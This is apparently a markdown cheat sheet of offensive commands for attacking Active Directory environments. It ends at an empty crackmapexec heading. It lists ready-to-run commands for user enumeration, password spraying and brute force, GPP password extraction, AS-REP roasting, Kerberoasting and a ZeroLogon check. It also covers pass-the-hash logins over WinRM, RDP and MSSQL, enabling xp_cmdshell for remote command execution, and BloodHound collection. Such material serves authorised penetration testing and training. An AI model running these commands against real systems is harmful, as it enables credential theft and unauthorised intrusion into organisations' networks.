# Active Directory

Table of Contents
=================

* [Black Box](#black-box)
   * [Recon](#recon)
      * [Get DC IP](#get-dc-ip)
      * [Enumerate users](#enumerate-users)
         * [Brute force RID](#brute-force-rid)
         * [Brute force username (as a last resort)](#brute-force-username-as-a-last-resort)
      * [SMB shares](#smb-shares)
         * [Check if a guest user can access the shares](#check-if-a-guest-user-can-access-the-shares)
         * [Check if NULL session is authorized](#check-if-null-session-is-authorized)
      * [LDAP](#ldap)
   * [Exploit](#exploit)
      * [Brute force passwords](#brute-force-passwords)
      * [SMB shares](#smb-shares-1)
         * [GPP passwords](#gpp-passwords)
         * [Find interesting files](#find-interesting-files)
      * [LDAP](#ldap-1)
         * [ASREProast](#asreproast)
         * [Kerberoast](#kerberoast)
      * [ZeroLogon](#zerologon)
* [Grey Box](#grey-box)
   * [Recon](#recon-1)
      * [Find ADCS](#find-adcs)
      * [Get DNS records](#get-dns-records)

<!-- Created by https://github.com/ekalinin/github-markdown-toc -->


### Useful information

- Blank LMhash : `aad3b435b51404eeaad3b435b51404ee`


# Black Box

## Recon

### Get DC IP

```bash
nslookup -type=srv _ldap._tcp.dc._msdcs."$DOMAIN" 
```	

### Enumerate users

#### RPC command
```bash
rpcclient -U '' -I "$DC_HOST" -c "enumdomusers"
```
#### Brute force RID (RPC)
```bash
nxc smb $DC_IP -u '' -p '' --rid-brute
```

#### Brute force username (as a last resort)
```bash
kerbrute userenum --domain "$DOMAIN" usernames.txt
```

### SMB shares

#### Check if a guest user can access the shares
```bash
nxc smb $IP -u 'guest' -p '' --shares
```
Note: This command can also be sprayed over a range of IPs

```bash
nxc smb $IP/24 -u 'guest' -p '' --shares
```

#### Check if NULL session is authorized
```bash
nxc smb $IP -u '' -p '' --shares
```

### LDAP

```bash	
ldapsearch -H "ldap://$DC_IP" -x -s base namingcontexts
```

```bash
ldapsearch -H "ldap://$DC_IP" -x -b "DC=DOMAIN,DC=LOCAL"
```
If you receive the followin error, valid credentials are needed:

```
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
```



## Exploit

### Brute force passwords

Check if users have the same password as their username
```bash
kerbrute passwordspray --user-as-pass --domain "$DOMAIN" users.txt
```

Check if users have empty password
```bash
kerbrute passwordspray --domain "$DOMAIN" users.txt ''
```

### SMB shares
#### GPP passwords
If the guest user has access to the SYSVOL share, it is possible to extract the GPP passwords if any
```bash
Get-GPPPassword "$DOMAIN"/"":""@"$DC_HOST"
```

You can also use the netexec module :
```bash	
nxc smb $DC_IP -u '' -p '' -M gpp_password -M gpp_autologin
``` 

#### Find interesting files 
[snafflepy](https://github.com/asmtlab/snafflepy.git) can be used to quickly identify interesting files on SMB shares
```bash
python3 snaffler.py -u '' -p '' -d "$DOMAIN" -n ips.txt
```

### LDAP

#### ASREProast

Get ASREProastable users.

```bash
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -usersfile users.txt -dc-ip "$DC_IP" "$DOMAIN"/
```

#### Kerberoast

If you managed to identify an ASREProastable user, it is possible to identify Kerberoastable users.

```bash
GetUserSPNs.py -outputfile Kerberoastables.txt -no-preauth "$USER" -usersfile "services.txt" -dc-host "$DC_IP" "$DOMAIN"/
```



### ZeroLogon
Check If the target is vulnerable to ZeroLogon 
```bash
nxc smb $DC_IP -u '' -p '' -M zerologon
```

### 

# Grey Box

## Recon

### Find ADCS

```bash
nxc ldap $DC_IP -u $USER -p $PASSWORD -M adcs
```	

### Get DNS records 

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get dnsDump
```

























## RPC

### rpcclient

1. Connect to a RPC service as an anonymous user

```bash
rpcclient -U "%" X.X.X.X
```

2. Connect to a RPC service as a user

```bash
rpcclient -U "<user>%<password>" X.X.X.X
```

3. Useful rpc commands

<details>
  <summary>Users enumeration</summary>

```bash
querydispinfo # List users
enumdomusers # List users
queryuser <0xrid> # User details
queryusergroups <0xrid> # User groups
lookupnames <username> # SID
queryuseraliases [builtin|domain] <sid> # Aliases
```

</details>

<details>
  <summary>Group enumeration</summary>

```bash
enumdomgroups # List groups
querygroup  <0xrid> # Group details
querygroupmem  <0xrid> # Group members
```

</details>

<details>
  <summary>Domains enumeration</summary>

```bash
enumdomains # List domains
lsaquery # Get SID
querydominfo # Domain info:
```

</details>
<details>
  <summary>Shares enumeration</summary>

```bash
netshareenumall # Enumerate all available shares
netsharegetinfo <share> # Info about a share
```

</details>

<details>
  <summary>More SIDs</summary>

```bash
lookupnames <username> # Find SIDs by name
lsaenumsid # Find more SIDs
lookupsids <sid> # RID cycling (check more SIDs)
```

</details>

## Kerbrute

source : https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64

1. Enumerate users

```bash
kerbrute userenum --dc X.X.X.X -d <domain> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

2. Check if a user has the same password as his username

```bash
kerbrute bruteuser --dc X.X.X.X -d <domain> <user> ./user.txt
```

3. Bruteforce passwords

```bash
kerbrute bruteuser --dc X.X.X.X -d <domain> <user> /usr/share/seclists/Passwords/rockyou.txt
```

## SMB

### smbclient

1. map the share

```bash
smbmap -H X.X.X.X
```

2. Connect to a SMB service as an anonymous user

```bash
smbclient -L //X.X.X.X
```

3. Connect to a SMB service as a user

```bash
smbclient -L //X.X.X.X -U "<user>%<password>"
```

4. Connect to a SMB service as a user and list files

```bash
smbclient //X.X.X.X -U "<user>%<password>"
```

## MSSQL

### mssqlclient

1. Connect to a MSSQL service as an anonymous user

```bash
impacket-mssqlclient -H X.X.X.X -p 1433 -U sa
```

2. Connect to a MSSQL service as a user

```bash
impacket-mssqlclient -H X.X.X.X -p 1433 -U <user> -P <password>
```

2. Connect to a MSSQL service as a user with the hash

```bash
impacket-mssqlclient -H X.X.X.X -p 1433 -U <user> -hashes <LM>:<NT>
```

4. Useful mssql commands

<details>
  <summary>Users enumeration</summary>

```bash
SELECT name FROM master..syslogins
```

</details>

<details>
  <summary>Database enumeration</summary>

```bash
SELECT name FROM master..sysdatabases
```

</details>

<details>
  <summary>Remote Command execution</summary>

```bash
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

</details>

## WinRM

### Evil-WinRM

source : `sudo apt install evil-winrm`

1. Connect to a WinRM service as a user

```bash
evil-winrm -i X.X.X.X -u <user> -p <password>
```

2. Connect to a WinRM service as a user with the hash

```bash
evil-winrm -i X.X.X.X -u <user> -H <NThash>
```

## RDP

### xfreerdp

1. Connect to a RDP service as a user

```bash
xfreerdp /u:<user> /p:<password> /v:X.X.X.X
```

2. Connect to a RDP service as a user with the hash

```bash
xfreerdp /u:<user> /pth:<NThash> /v:X.X.X.X
```

## Bloodhound

### Bloodhound python (sharpHound)

```bash
bloodhound-python -d <domain> -u <user> -p <password> -gc X.X.X.X -c all -ns X.X.X.X --zip
```

### Launch neo4j

```bash
sudo neo4j console
# in another shell
bloodhound
```

## crackmapexec

### smb

